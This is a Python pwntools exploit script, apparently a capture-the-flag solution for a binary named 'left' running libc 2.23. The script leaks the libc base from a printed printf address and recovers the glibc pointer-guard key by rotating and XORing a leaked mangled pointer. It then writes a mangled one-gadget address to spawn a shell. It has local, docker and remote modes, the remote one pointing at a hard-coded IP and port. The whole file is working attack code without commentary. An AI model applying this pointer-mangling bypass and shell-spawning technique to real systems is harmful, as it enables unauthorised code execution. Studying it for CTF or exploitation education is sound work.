from pwn import *
import sys
from time import time

LOCAL_LIBC32 = "/lib/i386-linux-gnu/libc.so.6"
LOCAL_LIBC64 = "/lib/x86_64-linux-gnu/libc.so.6"

BINARY = "./left"
LIBC = "./libc-2.23.so"
LOCAL_LIBC = LOCAL_LIBC64

context.clear()
context(os="linux", arch="amd64", bits=64)

def exploit(conn, elf, libc, local):
    conn.recvuntil("printf(): ")
    libc.address = int(conn.recvuntil("\n")[:-1]) - libc.symbols['printf']
    conn.recvline()
    conn.sendline(str(libc.address + 0x3c5c58))
    conn.recvuntil("content: ")
    key = ror(int(conn.recvuntil("\n")[:-1]), 0x11) ^ (libc.address + 0x3daab0)  # libc.symbols['_dl_fini']
    conn.recvline()
    conn.sendline(str(libc.address + 0x3c5c58))
    conn.recvlines(2)
    conn.sendline(str(rol((libc.address + 0x4526a) ^ key, 0x11)).rstrip('L'))
    conn.interactive()
    return

if __name__ == "__main__":
    elf = ELF(BINARY)
    try:
        if sys.argv[1] == "remote":
            H,P = ("159.203.116.12", 7777)
            r = remote(H, P)
            libc = ELF(LIBC) if LIBC else None
            exploit(r, elf, libc, local=False)
        elif sys.argv[1] == "local":
            r = process(BINARY)
            log.info("PID: {}".format(r.proc.pid))
            libc = ELF(LOCAL_LIBC) if LOCAL_LIBC else None
            pause()
            exploit(r, elf, libc, local=True)
        elif sys.argv[1] == "docker":
            r = process(BINARY, env = {"LD_PRELOAD": LIBC})
            libc = ELF(LIBC) if LIBC else None
            pause()
            exploit(r, elf, libc, local=True)
        else:
            print "Usage: {} local|docker|remote".format(sys.argv[0])
            sys.exit(1)
    except IndexError:
        r = process(BINARY)
        log.info("PID: {}".format(r.proc.pid))
        libc = ELF(LOCAL_LIBC) if LOCAL_LIBC else None
        pause()
        exploit(r, elf, libc, local=True)
